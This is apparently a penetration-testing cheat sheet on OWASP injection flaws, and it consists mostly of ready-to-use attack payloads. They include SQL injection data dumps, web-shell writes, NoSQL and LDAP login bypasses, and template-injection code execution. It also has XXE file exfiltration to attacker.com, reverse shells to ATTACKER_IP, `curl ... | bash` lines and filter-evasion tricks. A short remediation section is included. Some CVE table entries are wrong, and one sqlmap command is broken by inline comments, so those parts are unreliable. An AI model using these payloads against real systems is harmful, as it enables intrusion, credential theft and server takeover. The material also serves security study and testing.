# A03: Injection

OWASP #3 (was #1 for many years). 94% of applications tested for injection.
XSS absorbed into this category in 2021. Most CVEs of any category.
CWEs: CWE-79, CWE-89, CWE-77, CWE-564, CWE-943.

---

## Overview

Injection occurs when untrusted data is sent to an interpreter as part of a command
or query. The interpreter executes the data as code. Covers:
- SQL Injection (all types)
- NoSQL Injection (MongoDB operator injection)
- LDAP Injection
- OS Command Injection
- XML External Entity (XXE)
- Server-Side Template Injection (SSTI)
- Client-Side Template Injection (CSTI)

---

## Detection Methods

```bash
# Automated
sqlmap -u "https://target.com/page?id=1" --dbs
nuclei -u https://target.com -t vulnerabilities/
commix --url="https://target.com/page?cmd=test"

# Manual - inject metacharacters and observe errors
# SQL: ' " ; -- # /* */
# NoSQL: { } [ ] $gt $ne $where
# Command: ; | & ` $()
# Template: {{ }} ${ } #{} <%=  %>
# LDAP: * ) ( \ / NUL

# Fuzz all parameters
ffuf -u https://target.com/page?id=FUZZ -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt

# Burp Suite: Scanner, Intruder with injection wordlists
```

---

## What to Look For

**SQL Injection indicators:**
- Error messages: `You have an error in your SQL syntax`
- `ORA-01756: quoted string not properly terminated`
- `Microsoft OLE DB Provider for SQL Server error`
- Response changes when adding `'` vs `''`
- Time delays with `SLEEP(5)` or `WAITFOR DELAY '0:0:5'`
- Boolean-based: different content for `1=1` vs `1=2`

**Command injection indicators:**
- Output of OS commands in response
- Time delays with `sleep 10`
- DNS callbacks to Burp Collaborator

**SSTI indicators:**
- `{{7*7}}` → `49` in response
- `${7*7}` → `49`
- `<%= 7*7 %>` → `49`

**XXE indicators:**
- XML parsing errors
- Internal file contents returned
- DNS/HTTP callbacks to external server

---

## Testing Methodology

### SQL Injection

```
# Step 1: Identify injection point
https://target.com/item?id=1'
# If error or different response → potentially injectable

# Step 2: Confirm injection type
# Boolean-based:
?id=1 AND 1=1--     # true condition → same result
?id=1 AND 1=2--     # false condition → different/no result

# Time-based blind:
?id=1; SLEEP(5)--                          # MySQL
?id=1; WAITFOR DELAY '0:0:5'--             # MSSQL
?id=1; SELECT pg_sleep(5)--                # PostgreSQL

# Step 3: Enumerate columns (UNION)
?id=1 ORDER BY 1--   # no error
?id=1 ORDER BY 2--   # no error
?id=1 ORDER BY 5--   # error → 4 columns

# Step 4: Extract data
?id=0 UNION SELECT 1,2,database(),4--
?id=0 UNION SELECT 1,2,group_concat(table_name),4 FROM information_schema.tables WHERE table_schema=database()--
```

### SQL Injection - Database Specific
```sql
-- MySQL
# Version
@@version, version()
# Tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
# File read (if FILE priv)
LOAD_FILE('/etc/passwd')
# File write
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'

-- MSSQL
# Version
@@version
# Current DB user
system_user, user_name()
# Command execution (if xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami'
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- PostgreSQL
# Version
version()
# OS command (superuser only)
COPY cmd_exec FROM PROGRAM 'id';
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;
# Large Object RCE
SELECT lo_import('/etc/passwd');

-- Oracle
# Version
SELECT * FROM v$version
# Tables
SELECT table_name FROM all_tables
# Dual table for UNION
SELECT null FROM dual
```

### Blind SQL Injection
```
# Boolean-based (manual)
# True: ?id=1 AND SUBSTRING((SELECT database()),1,1)='a'
# False if first char != 'a'

# Automate with sqlmap
sqlmap -u "https://target.com/page?id=1" \
  --technique=B \    # Boolean-based blind
  --dbms=mysql \
  --level=5 \
  --risk=3 \
  -D target_db \
  -T users \
  --dump

# Time-based blind
sqlmap -u "https://target.com/page?id=1" --technique=T --dbms=mysql --dump

# Out-of-band (DNS exfiltration)
# MySQL:
' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\x'))--
# MSSQL:
'; EXEC master..xp_dirtree '\\attacker.com\x'--
```

### Second-Order SQLi
```
# Data stored with escaping but later used unescaped
# Step 1: Register with username: admin'--
# Step 2: Change password (query uses stored username unsafely)
# UPDATE users SET password='new' WHERE username='admin'--'
# Affects admin account instead of your account
```

### NoSQL Injection (MongoDB)
```
# Authentication bypass with operator injection
# Vulnerable code: db.users.find({username: req.body.username, password: req.body.password})

# In request body (JSON):
{"username": "admin", "password": {"$gt": ""}}
# Translates to: WHERE username='admin' AND password > '' → matches any password

# In URL parameters:
?username=admin&password[$gt]=
?username=admin&password[$regex]=.*
?username[$ne]=x&password[$ne]=x   # find first user where username != x

# $where injection (JavaScript execution):
{"username": "admin", "$where": "sleep(5000)"}
{"$where": "this.password.match(/.*/) && sleep(5000)"}

# Blind extraction with $regex:
{"username": "admin", "password": {"$regex": "^a"}}    # true if starts with 'a'
{"username": "admin", "password": {"$regex": "^pa"}}   # true if starts with 'pa'
```

### LDAP Injection
```
# LDAP filter: (&(uid=USER)(password=PASS))
# Bypass with wildcard:
uid: *)(uid=*))(|(uid=*
# Results in: (&(uid=*)(uid=*))(|(uid=*)(password=PASS))
# First filter always true

# Authentication bypass:
username: *)(uid=*))(|(uid=*
password: anything

# Full LDAP injection payloads:
)
*)
*)(objectClass=*
*)(|(uid=*
admin)(&(uid=admin
admin)(|(uid=*
```

### OS Command Injection
```bash
# Basic injection characters
; id
| id
|| id
& id
&& id
`id`
$(id)

# Newline bypass:
%0a id

# Common vulnerable parameters:
?host=127.0.0.1; cat /etc/passwd
?filename=file.txt; id > /tmp/output
?cmd=ping&ip=127.0.0.1|id

# Blind command injection (time-based):
?host=127.0.0.1; sleep 10

# Out-of-band (DNS):
?host=127.0.0.1; nslookup `whoami`.attacker.com
?host=127.0.0.1; curl http://`id|base64`.attacker.com

# Python subprocess shell=True vulnerability:
# Code: subprocess.run(f"ping {user_input}", shell=True)
# Attack: ; curl http://attacker.com/shell.sh | bash
```

### XXE (XML External Entity)
```xml
<!-- Classic XXE - read local file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><name>&xxe;</name></data>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>

<!-- Blind XXE - out-of-band exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<!-- xxe.dtd on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- XXE in SVG file upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- XXE via local DTD (when external DTD blocked) -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### SSTI (Server-Side Template Injection)
```
# Detection payloads - engine fingerprinting
{{7*7}}           → 49 (Jinja2/Twig)
${7*7}            → 49 (FreeMarker/Thymeleaf)
#{7*7}            → 49 (Ruby ERB alternative)
<%= 7*7 %>        → 49 (ERB/EJS)
{{7*'7'}}         → 49 or 7777777 (distinguishes Jinja2 vs Twig)
${"z"?upper_case} → Z (FreeMarker)

# Jinja2 RCE payloads:
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode() }}

# Shorter Jinja2 RCE:
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Twig RCE:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker RCE:
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity RCE:
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
...

# CSTI (Angular 1.x sandbox escape):
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

---

## Exploitation Techniques

### SQLi to RCE (MySQL)
```bash
# Using sqlmap
sqlmap -u "https://target.com/page?id=1" \
  --os-shell    # interactive OS shell
  --file-write=/var/www/html/shell.php \
  --file-dest=/var/www/html/cmd.php

# Manual file write
# First find writable path via error messages or config
?id=1 UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php'--
# Then access: https://target.com/cmd.php?cmd=whoami
```

### SQLi to Credential Dump
```bash
sqlmap -u "https://target.com/login?id=1" \
  -D app_db -T users \
  --dump \
  --batch \
  --threads=10

# Manual:
' UNION SELECT username,password,3,4 FROM users--
```

### Command Injection - Reverse Shell
```bash
# After confirming command injection:
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; curl http://ATTACKER_IP/shell.sh | bash

# URL-encode for GET parameter:
%3b+bash+-i+>%26+%2fdev%2ftcp%2fATTACKER_IP%2f4444+0>%261
```

---

## Verification

```bash
# SQLi confirmed:
# Time-based: measure response time
time curl -s "https://target.com/page?id=1; SELECT SLEEP(5)--"
# If ~5s delay → SQLi confirmed

# Command injection: DNS callback
# Setup: python3 -m http.server 80
?cmd=; curl http://YOUR_IP/?$(whoami)
# Look for request in HTTP server logs

# XXE: Check OOB callback
# Burp Collaborator or interactsh
?xml=...<xxe SYSTEM "http://COLLABORATOR.net">...
# Check for DNS/HTTP interactions in Collaborator

# SSTI: Math evaluation
# If {{7*7}} returns 49 → SSTI confirmed
```

---

## Common Problems & Solutions

| Problem | Root Cause | Fix |
|---------|-----------|-----|
| SQLi in raw query | String concatenation | Parameterized queries / prepared statements |
| SQLi in ORM raw() | Bypassing ORM safety | Avoid raw(), use ORM methods |
| NoSQL operator injection | No key sanitization | Validate/sanitize keys, use allowlist |
| Command injection in subprocess | shell=True | Use shell=False with argument list |
| XXE in XML parser | External entity enabled | Disable external entities in parser config |
| SSTI in template | User input passed to render() | Never compile templates from user input |
| LDAP injection | String concat in filter | Use LDAP parameterization / encode special chars |

---

## Tools (with Commands)

```bash
# sqlmap - SQL injection automation
sqlmap -u "URL?param=1" --dbs --batch
sqlmap -u "URL" --data="POST_DATA" --dbs
sqlmap -r request.txt --dbs --batch      # From saved Burp request
sqlmap -u "URL?id=1" --level=5 --risk=3 --os-shell

# commix - command injection
commix --url="URL?cmd=test" --batch
commix -r request.txt

# XXEinjector
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/passwd --file=request.txt

# Tplmap - template injection scanner
python3 tplmap.py -u "https://target.com/?name=*"
python3 tplmap.py -u "https://target.com/?name=*" --os-shell

# NoSQLMap
python3 nosqlmap.py
# Or manual: use Burp to modify JSON/params

# ghauri - SQLi
ghauri -u "URL?id=1" --dbs --batch

# OWASP ZAP active scanner
zap-full-scan.py -t https://target.com -r report.html
```

---

## Bypass Techniques

### SQLi WAF Bypass
```sql
-- Case variation
SeLeCt, sElEcT

-- Comment insertion
SE/**/LECT, UN/*comment*/ION

-- URL encoding
%53%45%4C%45%43%54   -- SELECT

-- Double URL encoding
%2553%2545%254C%2545%2543%2554

-- Newlines/tabs
UNION%0aSELECT, UNION%09SELECT

-- MySQL scientific notation
1e0UNION1e0SELECT

-- No spaces (comment substitution)
UNION/**/SELECT/**/1,2,3

-- Hex encoding
0x61646d696e   -- 'admin'

-- CHAR() function
CHAR(65,68,77,73,78)  -- ADMIN

-- HTTP parameter pollution
?id=1&id=UNION SELECT 1,2--  -- some backends join values
```

### Command Injection Bypass
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat</etc/passwd
X=$'cat\t/etc/passwd'&&$X

# Keyword bypass (cat is blocked)
c\at /etc/passwd
ca$@t /etc/passwd
$(printf "\x63\x61\x74") /etc/passwd

# Newline bypass
command%0a/etc/passwd
```

---

## Remediation

```python
# SQL - parameterized queries
cursor.execute("SELECT * FROM users WHERE id = %s AND active = %s", (user_id, True))

# Command execution - no shell
import subprocess
result = subprocess.run(['ping', '-c', '1', host], capture_output=True, shell=False)

# XML parser - disable external entities (Python lxml)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml_data, parser=parser)

# Template - never eval user input
# WRONG: jinja2.Environment().from_string(user_input).render()
# RIGHT: jinja2.Environment().get_template('fixed_template.html').render(user_data=user_input)
```

---

## Real-World CVEs

| CVE | System | Type | Impact |
|-----|--------|------|--------|
| CVE-2021-44228 | Log4Shell | Expression injection (JNDI) | RCE, ~10M servers |
| CVE-2022-22965 | Spring4Shell | Expression injection | RCE |
| CVE-2018-11776 | Apache Struts | OGNL injection | RCE |
| CVE-2017-12611 | Apache Struts | OGNL injection | RCE (Equifax breach) |
| CVE-2019-0232 | Apache Tomcat CGI | Command injection | RCE |
| CVE-2014-6271 | Shellshock/Bash | Command injection | ~500M servers |
| 2016 Yahoo | Yahoo DB | SQL injection | 500M records stolen |
| CVE-2021-3129 | Laravel debug | XXE/RCE | RCE via deserialization |
